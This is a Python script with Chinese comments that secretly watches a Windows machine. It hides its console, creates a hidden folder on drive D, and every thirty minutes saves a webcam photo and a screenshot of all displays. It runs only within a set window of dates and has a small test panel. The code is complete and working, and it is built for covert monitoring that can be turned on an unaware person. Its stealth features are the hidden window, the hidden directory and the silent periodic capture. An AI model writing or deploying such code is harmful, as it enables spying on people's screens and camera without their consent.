import os
import sys
import time
import ctypes
import datetime
import logging
import threading
from pathlib import Path

import cv2
from PIL import ImageGrab

# -------------------- 配置参数 --------------------
BASE_DIR = Path("D:/HiddenCaptures")          # 隐藏根目录
CAM_SUBDIR = "Camera"                         # 摄像头子目录
SCR_SUBDIR = "Screenshot"                     # 截屏子目录
LOG_FILE = "capture.log"                      # 日志文件（置于根目录）

INTERVAL_SECONDS = 30 * 60                    # 30分钟
RETRY_DELAY = 5 * 60                          # 失败后重试等待（秒）
MAX_RETRIES = 3                               # 单次任务最大重试次数
CAM_WARMUP_FRAMES = 30                        # 摄像头丢弃帧数
CAMERA_INDEX = 0                              # 默认摄像头索引

# 可运行日期范围
VALID_START = datetime.date(2026, 5, 25)
VALID_END = datetime.date(2026, 5, 27)

# -------------------- 工具函数 --------------------
def hide_console():
    """隐藏控制台窗口（仅Windows有效）"""
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass

def ensure_dir(path: Path, hidden: bool = False):
    """创建目录，可选设置隐藏属性"""
    path.mkdir(parents=True, exist_ok=True)
    if hidden and os.name == 'nt':
        try:
            # 设置文件夹为隐藏
            ctypes.windll.kernel32.SetFileAttributesW(str(path), 0x02)
        except Exception:
            pass

def get_timestamp():
    """返回用于文件名的精确时间戳"""
    return datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")

def setup_logging(log_path: Path):
    """配置文件日志，仅在控制台可用时输出到控制台"""
    log_path.parent.mkdir(parents=True, exist_ok=True)
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)

    # 文件日志处理器
    file_handler = logging.FileHandler(str(log_path), encoding='utf-8')
    file_handler.setLevel(logging.INFO)
    file_formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
    file_handler.setFormatter(file_formatter)
    logger.addHandler(file_handler)

    # 控制台处理器：仅在 stdout 可用时添加（避免无控制台崩溃）
    if sys.stdout is not None:
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        console_handler.setFormatter(file_formatter)
        logger.addHandler(console_handler)

# -------------------- 核心捕获逻辑 --------------------
def capture_camera(save_path: Path) -> bool:
    """
    打开摄像头，丢弃前几帧以等待稳定，拍摄一张高质量照片。
    成功返回 True，失败返回 False。
    """
    cap = None
    try:
        cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)  # Windows下使用DSHOW加速
        if not cap.isOpened():
            logging.error("无法打开摄像头")
            return False

        # 尝试设置高分辨率
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)
        # 有些摄像头可能需要MJPG格式才能达到高分辨率
        cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))

        # 丢弃前N帧，等待自动曝光/白平衡稳定
        for _ in range(CAM_WARMUP_FRAMES):
            ret, _ = cap.read()
            if not ret:
                logging.warning("预热帧读取失败")
                break
            time.sleep(0.05)  # 短暂等待，让摄像头调整

        # 拍摄最终帧
        ret, frame = cap.read()
        if not ret or frame is None:
            logging.error("拍摄照片失败")
            return False

        # 保存为高质量PNG
        save_path.parent.mkdir(parents=True, exist_ok=True)
        cv2.imwrite(str(save_path), frame, [cv2.IMWRITE_PNG_COMPRESSION, 3])
        logging.info(f"摄像头照片已保存: {save_path}")
        return True

    except Exception as e:
        logging.error(f"摄像头异常: {e}")
        return False
    finally:
        if cap is not None:
            cap.release()

def capture_screen(save_path: Path) -> bool:
    """
    截取整个屏幕并保存。锁屏或失败时静默忽略，返回 False。
    """
    try:
        img = ImageGrab.grab(all_screens=True)  # all_screens=True 包含所有显示器
        if img is None:
            logging.warning("截屏返回空图像（可能锁屏或远程桌面）")
            return False

        save_path.parent.mkdir(parents=True, exist_ok=True)
        img.save(str(save_path), "PNG")
        logging.info(f"屏幕截图已保存: {save_path}")
        return True

    except OSError as e:
        # 锁屏、无显示器会话等常见错误
        logging.warning(f"截屏失败（可能锁屏或会话不可用）: {e}")
        return False
    except Exception as e:
        logging.error(f"截屏异常: {e}")
        return False

def execute_task_with_retry():
    """
    执行一次拍摄任务：分别拍摄摄像头和截屏，
    若摄像头失败则等待 RETRY_DELAY 后重试（最多 MAX_RETRIES 次），
    截屏失败仅记录，不重试。
    """
    timestamp = get_timestamp()
    cam_dir = BASE_DIR / CAM_SUBDIR
    scr_dir = BASE_DIR / SCR_SUBDIR

    # --- 摄像头任务（可重试） ---
    success_cam = False
    for attempt in range(1, MAX_RETRIES + 1):
        cam_path = cam_dir / f"{timestamp}_cam.png"
        if capture_camera(cam_path):
            success_cam = True
            break
        else:
            logging.warning(f"摄像头拍摄失败，第{attempt}次尝试")
            if attempt < MAX_RETRIES:
                logging.info(f"等待 {RETRY_DELAY} 秒后重试...")
                time.sleep(RETRY_DELAY)
                # 重试时更新时间戳，避免文件名冲突
                timestamp = get_timestamp()
    if not success_cam:
        logging.error("摄像头拍摄最终失败，放弃本次摄像头任务")

    # --- 屏幕截图任务（不重试） ---
    scr_path = scr_dir / f"{timestamp}_scr.png"
    capture_screen(scr_path)  # 失败也不影响后续

# -------------------- 正常模式（后台定时） --------------------
def normal_mode():
    """检查日期，若在有效范围内则进入定时循环"""
    today = datetime.date.today()
    if not (VALID_START <= today <= VALID_END):
        logging.info(f"当前日期 {today} 不在允许范围内 ({VALID_START} ~ {VALID_END})，程序退出。")
        sys.exit(0)

    logging.info("进入正常监控模式，每30分钟执行一次拍摄...")
    while True:
        try:
            execute_task_with_retry()
        except Exception as e:
            logging.error(f"任务执行出现未捕获异常: {e}")
        # 等待间隔，但在等待期间可被KeyboardInterrupt中断
        time.sleep(INTERVAL_SECONDS)

# -------------------- 测试模式（带简单窗口） --------------------
def test_mode():
    """带窗口的测试模式，可手动触发拍摄"""
    import tkinter as tk
    from tkinter import messagebox

    # 确保根目录和日志已准备
    ensure_dir(BASE_DIR, hidden=True)
    ensure_dir(BASE_DIR / CAM_SUBDIR)
    ensure_dir(BASE_DIR / SCR_SUBDIR)

    def run_task():
        """在后台线程运行任务，完成后更新UI"""
        btn.config(state=tk.DISABLED)
        status_var.set("正在拍摄，请稍候...")
        def worker():
            try:
                execute_task_with_retry()
                # 成功提示在主线程
                root.after(0, lambda: status_var.set("任务完成！可查看保存的图片。"))
            except Exception as e:
                root.after(0, lambda: messagebox.showerror("错误", f"发生异常:\n{e}"))
            finally:
                root.after(0, lambda: btn.config(state=tk.NORMAL))
        threading.Thread(target=worker, daemon=True).start()

    root = tk.Tk()
    root.title("测试模式 - 屏幕与摄像头捕获")
    root.geometry("320x180")
    root.resizable(False, False)

    tk.Label(root, text="测试控制面板", font=("微软雅黑", 12)).pack(pady=10)
    status_var = tk.StringVar(value="点击按钮立即执行一次拍摄")
    tk.Label(root, textvariable=status_var, wraplength=280).pack(pady=5)
    btn = tk.Button(root, text="立即拍摄", command=run_task, width=15, height=2)
    btn.pack(pady=10)

    logging.info("测试窗口已启动")
    root.mainloop()

# -------------------- 主入口 --------------------
if __name__ == "__main__":
    # 隐藏控制台（即使在 .pyw 下也无害）
    hide_console()

    # 确保隐藏根目录存在
    ensure_dir(BASE_DIR, hidden=True)
    # 创建子目录
    ensure_dir(BASE_DIR / CAM_SUBDIR)
    ensure_dir(BASE_DIR / SCR_SUBDIR)

    # 配置日志
    setup_logging(BASE_DIR / LOG_FILE)

    # 判断运行模式：只有命令行参数包含 "test" 才进入测试模式，其余均以正常模式运行
    # 对多余参数不做任何报错或退出，统统忽略
    if "test" in sys.argv:
        logging.info("以测试模式启动")
        test_mode()
    else:
        logging.info("以正常模式启动")
        normal_mode()
